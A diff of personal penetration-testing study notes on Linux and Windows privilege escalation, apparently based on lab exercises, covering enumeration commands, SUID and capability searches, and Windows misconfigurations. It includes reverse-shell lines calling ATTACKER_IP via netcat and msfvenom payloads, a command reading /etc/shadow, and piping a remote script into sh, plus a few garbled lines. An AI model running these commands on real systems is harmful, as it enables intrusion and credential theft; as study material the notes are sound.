@@ -1,5 +1,176 @@
-[PRIVILEGE_ESCALATION]
-==[LINPEAS]==
+====[ Privilege Escalation Linux ]====
+
+### hostname
+The hostname command will return the hostname of the target machine. 
+Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), 
+in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).
+
+###uname -a
+Will print system information giving us additional detail about the kernel used by the system. 
+This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
+
+###/proc/version
+The proc filesystem (procfs) provides information about the target system processes. 
+You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.
+Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
+
+###/etc/issue
+Systems can also be identified by looking at the /etc/issue file. 
+This file usually contains some information about the operating system but can easily be customized or changed. 
+While on the subject, any file containing system information can be customized or changed. 
+For a clearer understanding of the system, it is always good to look at all of these.
+
+###ps Command
+The ps command is an effective way to see the running processes on a Linux system. 
+Typing ps on your terminal will show processes for the current shell.
+The output of the ps (Process Status) will show the following;
+
+	PID: The process ID (unique to the process)
+	TTY: Terminal type used by the user
+	Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
+	CMD: The command or executable running (will NOT display any command line parameter)
+
+The “ps” command provides a few useful options.
+	ps -A: View all running processes
+	ps axjf: View process tree (see the tree formation until ps axjf is run below)
+	ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), 
+	and show processes that are not attached to a terminal (x). 
+	Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
+	
+###env
+The env command will show environmental variables.
+	The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
+	The HOME variable report the user home directory
+	The SHELL variable report the type of shell (and sometimes functionality and os versions)
+	The LOGNAME variable
+
+##### sudo -l #####
+The target system may be configured to allow users to run some (or all) commands with root privileges. 
+The sudo -l command can be used to list all commands your user can run using sudo.
+
+###ls
+One of the common commands used in Linux is probably ls.
+
+While looking for potential privilege escalation vectors, 
+please remember to always use the ls command with the -la parameter. 
+The example below shows how the “secret.txt” file can easily be missed using the ls or ls -l commands.
+
+###Id
+The id command will provide a general overview of the user’s privilege level and group memberships.
+It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.
+
+###/etc/passwd
+Reading the /etc/passwd file can be an easy way to discover users on the system.
+While the output can be long and a bit intimidating, 
+it can easily be cut and converted to a useful list for brute-force attacks.
+Remember that this will return all users, some of which are system or service users that would not be very useful. 
+Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.
+
+###history
+Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.
+
+###ifconfig
+The target system may be a pivoting point to another network. 
+The ifconfig command will give us information about the network interfaces of the system. 
+
+###netstat
+Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. 
+The netstat command can be used with several different options to gather information on existing connections.
+	netstat -a: shows all listening ports and established connections.
+	netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
+	netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. 
+				This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
+	netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
+	netstat -tp: list connections with the service name and PID information.
+				This can also be used with the -l option to list listening ports (below)
+				We can see the “PID/Program name” column is empty as this process is owned by another user.
+				Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)
+
+	netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
+
+The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;
+	-a: Display all sockets
+	-n: Do not resolve names
+	-o: Display timers
+
+ ####[ FIND Command ]####
+Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
+Below are some useful examples for the “find” command.
+
+Find files:
+
+	find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+	find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+	find / -type d -name config: find the directory named config under “/”
+	-->> find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+	-->> find / -perm a=x: find executable files
+	find /home -user frank: find all files for user “frank” under “/home”
+	find / -mtime 10: find files that were modified in the last 10 days
+	find / -atime 10: find files that were accessed in the last 10 day
+	find / -cmin -60: find files changed within the last hour (60 minutes)
+	find / -amin -60: find files accesses within the last hour (60 minutes)
+	find / -size 50M: find files with a 50 MB size
+	This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
+
+Folders and files that can be written to or executed from:
+	find / -writable -type d 2>/dev/null : Find world-writeable folders
+	find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
+	find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
+
+The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. 
+	find / -perm -o x -type d 2>/dev/null : Find world-executable folders
+
+Find development tools and supported languages:
+	find / -name perl*
+	find / -name python*
+	find / -name gcc*
+
+Find specific file permissions:
+
+	Below is a short example used to find files that have the SUID bit set. 
+	The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. 
+	This allows for an interesting privilege escalation path.
+	The example below is given to complete the subject on the “find” command.
+
+	find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
+	
+	==>> find / -type f -perm -04000 -ls 2>/dev/null
+	
+#### getcap ####
+The getcap command is used to examine file capabilities on a Linux system. It displays the name and capabilities of each specified file.
+ The command can be used with various options to modify its behavior:
+
+-r: Enables recursive search, allowing the command to traverse directories and display capabilities for all files and subdirectories.
+-v: Enables displaying all searched entries, even if they have no file capabilities.
+-h: Prints quick usage information.
+The getcap command reads the extended attributes of a file to display the assigned capabilities, which allow non-root users to execute specific programs with certain elevated privileges.
+ For example, a program might be granted the CAP_NET_RAW capability to create raw sockets without requiring the entire program to run as root.
+
+In addition to examining file capabilities, getcap can also be used to display process capabilities by specifying a Process ID (PID) with the -p option.
+ This shows the Effective, Permitted, and Inheritable capability sets of the process.
+
+The getcap command is often used in conjunction with the setcap command, which is used to assign or remove capabilities from files.
+ Understanding a file's capabilities is crucial for auditing security and troubleshooting permission-related issues.
+ 
+getcap -r / 2>/dev/null
+
+/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d > /tmp/shadow
+unshadow passdw shadow | tee hash
+	
+	
+=====[ AUTOMATED LINUX ENUMERATION TOOLS ]=====
+
+### LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
+### LinEnum: https://github.com/rebootuser/LinEnum
+
+### LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+
+Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+ ====[LINPEAS]====
 # From public github
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
@@ -23,3 +194,163 @@ less -r /dev/shm/linpeas.txt #Read with colors
 wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
 chmod +x linpeas_linux_amd64
 ./linpeas_linux_amd64
+
+use of command through sudo -l
+use of command or files with suid bit set
+use of cron jobs
+use of shared library loaded by some program who support LD_PRELOAD
+
+
+====[ Privilege Escalation Windows ]====
+SYSTEM / LocalSystem ==> 	An account used by the operating system to perform internal tasks. 
+							It has full access to all files and resources available on the host with even higher privileges than administrators.
+Local Service		 ==>	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
+Network Service		 ==>	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
+
+
+####Unattended Windows Installations
+When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, 
+which allows for a single operating system image to be deployed to several hosts through the network. 
+These kinds of installations are referred to as unattended installations as they don't require user interaction. 
+Such installations require the use of an administrator account to perform the initial setup, 
+which might end up being stored in the machine in the following locations:
+
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+As part of these files, you might encounter credentials:
+
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
+</Credentials>
+
+
+####Powershell History
+Whenever a user runs a command using Powershell, 
+it gets stored into a file that keeps a memory of past commands. 
+This is useful for repeating commands you have used before quickly. 
+If a user runs a command that includes a password directly as part of the Powershell command line, 
+it can later be retrieved by using the following command from a cmd.exe prompt:
+
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Note: The command above will only work from cmd.exe, 
+s Powershell won't recognize %userprofile% as an environment variable. 
+To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 
+
+####Saved Windows Credentials
+Windows allows us to use other users' credentials. 
+This function also gives the option to save these credentials on the system.
+The command below will list saved credentials:
+
+cmdkey /list
+While you can't see the actual passwords,
+if you notice any credentials worth trying, 
+you can use them with the runas command and the /savecred option, as seen below.
+runas /savecred /user:admin cmd.exe
+
+Scheduled Tasks
+Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
+Scheduled tasks can be listed from the command line using the schtasks command without any options ( but retrieve ALL the tasks ). 
+To retrieve detailed information about ONE of the services, you can use a command like this:
+schtasks /query /tn vulntask /fo list /v
+which query and retrieve info about a task called "vulntask" like this:
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
+Where the most important info is the TaskToRun and the RunAsUser parameter
+eventually you can check for file permissions with icacls :
+icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. 
+This means we can modify the .bat file and insert any payload we like
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat > create peass-ng/PEASS-ng/releases/latest/download/linpeas
+nc -lvp 4444 > launch netcat to listen for incoming connection 
+schtasks /run /tn vulntask ==> run the task and launch the netcat binary to open a connection
+
+####AlwaysInstallElevated
+Windows installer files (also known as .msi files) are used to install applications on the system. 
+They usually run with the privilege level of the user that starts it. 
+However, these can be configured to run with higher privileges from any user account (even unprivileged ones). 
+This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
+
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+To be able to exploit this vulnerability, both should be set.
+To be able to exploit this vulnerability, both should be set. 
+Otherwise, exploitation will not be possible. 
+If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+##### INSECURE Services
+ sc qc apphostsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: apphostsvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost ===>> service binary name (apphost)
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem ==>> User authorized to start the service
+		
+A service is a special executable that need to communicate with windows scm (service control manager) to work.
+Services have a Discretionary Access Control List (DACL), 
+which indicates who has permission to start, stop, pause, query status, 
+query configuration, or reconfigure the service, amongst other privileges. 
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+								  
+In this case everyone has the possibility to modify the executable running as a service
+so everyone  could substitute the exe with msfvenom and create a payload to open a shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+and launch : nc -lnvp 4445
+
+#### UNQUOTED Service Paths
+are services with a path set without quotes and spaces like 
+BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+in this case windows tries to launch 
+C:\MyPrograms\Disk.exe	
+C:\MyPrograms\Disk Sorter.exe	
+C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe	
+trying to automatically recover a faulty user installation
+but the executable cab be substituted with the worng one if the folder containing it 
+has the wrong permission:
+C:\>icacls c:\MyPrograms
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.
+so we can create a payload called Disk.exe and copy it to the right dir and start the service whichwill read for first
+our service and open a shell
+
+https://github.com/gtworek/Priv2Admin  ==>> EXPLOITABLE PRIVILEGES
+https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants ==>> PRIVILEGES
+
+The <SeBackup> and <SeRestore> privileges allow users to read and write to any file in the system, ignoring any DACL in place. 
+The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
+The <SeTakeOwnership> privilege allows a user to take ownership of any object on the system, including files and registry keys, 
+opening up many possibilities for an attacker to elevate privileges, as we could, 
+for example, search for a service running as SYSTEM and take ownership of the service's executable. 
+SeImpersonate / SeAssignPrimaryToken allow a process to impersonate other users and act on their behalf. 
+Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
